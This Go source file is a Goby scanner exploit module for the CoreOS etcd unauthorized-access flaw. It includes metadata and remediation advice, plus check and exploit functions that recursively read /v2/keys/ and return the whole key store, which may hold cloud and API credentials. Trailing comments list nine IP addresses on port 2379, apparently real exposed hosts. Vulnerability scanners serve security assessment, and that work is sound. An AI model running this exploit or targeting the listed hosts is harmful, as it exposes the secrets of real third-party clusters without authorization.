package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CoreOS ETCD API Unauthorized Access",
    "Description": "ETCD is an open source project initiated by CoreOS. ETCD is a distributed and consistent KV storage system for shared configuration and service discovery. CoreOS ETCD cluster API has an unauthorized access vulnerability. ETCD is used as a Kubernetes backup storage area for all cluster data. This vulnerability may reveal a large amount of sensitive information.",
    "Product": "CoreOS etcd ",
    "Homepage": "https://coreos.com/etcd/",
    "DisclosureDate": "2021-06-09",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "protocol=\"etcd\"",
    "Level": "3",
    "Impact": "<p>Attackers can obtain AWS keys, API keys, and sensitive information about a series of services, and use the obtained keys to control the cluster for further attacks, seriously threatening the user's data security.</p>",
    "Recommendation": "<p>1. Please refer to the official authentication document to add authentication: <a href=\"https://github.com/etcd-io/etcd/blob/master/Documentation/v2/authentication.md,\">https://github.com/etcd-io/etcd/blob/master/Documentation/v2/authentication.md,</a> the password should preferably contain uppercase and lowercase letters, numbers and special Characters, etc., and the number of digits is greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the service.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://elweb.co/the-security-footgun-in-etcd/"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10214"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGet := httpclient.NewGetRequestConfig("/v2/keys/?recursive=true")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(u, cfgGet)
			if err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"node"`) && strings.Contains(resp.Utf8Html, `"key"`)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfgGet := httpclient.NewGetRequestConfig("/v2/keys/?recursive=true")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			if err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

// 47.93.223.82:2379
// 123.59.96.144:2379
// 39.106.80.7:2379
// 47.93.98.214:2379
// 39.98.113.99:2379
// 47.94.148.80:2379
// 36.112.130.125:2379
// 47.103.120.57:2379
// 121.89.212.163:2379
